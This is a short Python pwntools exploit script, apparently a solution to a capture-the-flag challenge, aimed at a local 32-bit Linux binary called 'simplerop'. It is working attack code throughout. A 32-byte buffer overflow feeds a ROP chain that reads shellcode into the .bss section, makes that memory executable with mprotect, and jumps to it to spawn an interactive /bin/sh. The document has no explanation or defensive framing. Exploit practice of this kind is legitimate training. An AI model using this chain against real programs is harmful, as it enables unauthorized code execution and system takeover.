from pwn import*
context(arch = 'i386',os='linux')
context.log_level = 'debug'

elf = ELF('./simplerop')
r = process('./simplerop')
rop = ROP(elf)

mprotect_addr = elf.symbols['mprotect']
#bss = 0x080eb000
bss = elf.bss() + 0x80
shellcode = asm(shellcraft.i386.sh())

rop.read(0,bss,0x100)
rop.mprotect(bss,0x2000,7)
rop.raw(bss)

payload ='A' * 32
payload += rop.chain()

r.sendlineafter(':',payload)
r.sendline(shellcode)
r.interactive()
